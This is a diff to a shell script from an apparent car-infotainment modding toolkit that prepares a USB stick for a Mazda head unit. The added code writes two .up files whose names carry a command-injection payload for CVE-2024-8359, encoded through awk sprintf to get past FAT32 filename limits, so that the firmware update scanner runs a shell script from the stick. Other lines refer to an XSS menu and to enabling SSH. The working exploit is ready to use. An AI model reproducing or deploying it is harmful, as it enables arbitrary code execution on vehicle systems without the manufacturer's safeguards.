@@ -216,6 +216,24 @@ make_usb() {
     }
   fi
 
+  # --- CVE-2024-8359 .up filename injection payloads --------------------------
+  # The CMU's reflash scanner (libjcireflashua.so) passes .up filenames to
+  # system() via snprintf without sanitisation: unzip -t "PATH" "e.gz" > /dev/null
+  # Inside the double-quoted PATH, $() command substitution fires. The filename
+  # encodes "sh /mnt/sd[abcd]1/t" (or /tmp/mnt/...) entirely via awk sprintf
+  # using ASCII codes — no / * ? \ " < > | : (all prohibited by FAT32).
+  # Two files cover both known CMU mount-point prefixes; the 't' trampoline
+  # deduplicates so only one actually runs tweaks.sh.
+  info "creating .up injection payloads (CVE-2024-8359)..."
+  # /mnt/sd[abcd]1/t  →  sh=115,104 sp=32 /=47 m=109 n=110 t=116 /=47
+  #   s=115 d=100 [=91 a=97 b=98 c=99 d=100 ]=93 1=49 /=47 t=116
+  local UP_MNT UP_TMP
+  UP_MNT='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
+  # /tmp/mnt/sd[abcd]1/t  →  adds t=116 m=109 p=112 /=47 before mnt
+  UP_TMP='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
+  : > "/Volumes/MZD/${UP_MNT}"  || warn "could not create .up payload (mnt)"
+  : > "/Volumes/MZD/${UP_TMP}"  || warn "could not create .up payload (tmp/mnt)"
+
   # Also strip any macOS bookkeeping files that appeared regardless.
   find /Volumes/MZD \( -name '._*' -o -name '.DS_Store' -o -name '.Trashes' \
                        -o -name '.Spotlight-V100' -o -name '.fseventsd' \
@@ -241,7 +259,8 @@ make_usb() {
   local problems=0
   local f srcf src_md5 dst_md5
   for f in s dev.html mp3/a.mp3 mp3/b.mp3 mp3/c.mp3 mp3/d.mp3 \
-           a.mp3 b.mp3 c.mp3 d.mp3 js/run.js js/enable_ssh.sh css/init.css; do
+           a.mp3 b.mp3 c.mp3 d.mp3 js/run.js js/enable_ssh.sh css/init.css \
+           jci-autoupdate dataRetrieval_config.txt tweaks.sh t h; do
     if [ ! -e "/Volumes/MZD/$f" ]; then
       err "  MISSING: $f"
       problems=$((problems+1))
@@ -266,6 +285,15 @@ make_usb() {
       problems=$((problems+1))
     fi
   done
+  # Verify .up injection payloads exist on the stick.
+  local up_count
+  up_count=$(find /Volumes/MZD -maxdepth 1 -name '*.up' 2>/dev/null | wc -l | tr -d ' ')
+  if [ "$up_count" -ge 2 ]; then
+    ok "  $up_count .up injection payloads present"
+  else
+    err "  expected 2 .up payload files, found $up_count — CVE-2024-8359 trigger will not work"
+    problems=$((problems+1))
+  fi
   # Reject if AppleDouble sidecars survived (they should not).
   local dsc
   dsc=$(find /Volumes/MZD -name '._*' 2>/dev/null | wc -l | tr -d ' ')
@@ -277,18 +305,21 @@ make_usb() {
   if [ "$problems" -eq 0 ]; then
     ok "all critical files present + byte-identical to source, no AppleDouble junk"
   else
-    err "$problems problem(s) above — stick will NOT trigger the XSS. Re-run option 1."
+    err "$problems problem(s) above — stick may not work. Re-run option 1."
     diskutil eject /Volumes/MZD 2>/dev/null || true
     return 1
   fi
 
   diskutil eject /Volumes/MZD
   echo
-  ok "USB ready. In the car: Media → USB → tap any mp3 (or wait — it may autoplay) → the XSS menu appears."
-  info "  SSH   — enable SSH for this toolkit"
-  info "  HUD+  — install the CarPlay + Android Auto HUD patch (tap twice; the unit reboots by itself)"
-  info "  HUD-  — remove it (back to stock)      HUD? — check that every part is active"
-  info "  Every HUD button ends with a message on screen — if it says ERROR, photo it and send it;"
+  ok "USB ready. In the car:"
+  info "  1. Insert USB → wait ~30s → a dialog appears with Install / Uninstall / Check."
+  info "     (The .up injection triggers automatically via the firmware update scanner.)"
+  info "  2. If no dialog appears: Media → USB → tap any mp3 → the XSS menu appears."
+  info "     SSH   — enable SSH for this toolkit"
+  info "     HUD+  — install the CarPlay + Android Auto HUD patch"
+  info "     HUD-  — remove it (back to stock)      HUD? — check that every part is active"
+  info "  Every action ends with a message on screen — if it says ERROR, photo it and send it;"
   info "  the same text + the full log are on the stick in hud-mod/logs/."
 }
 
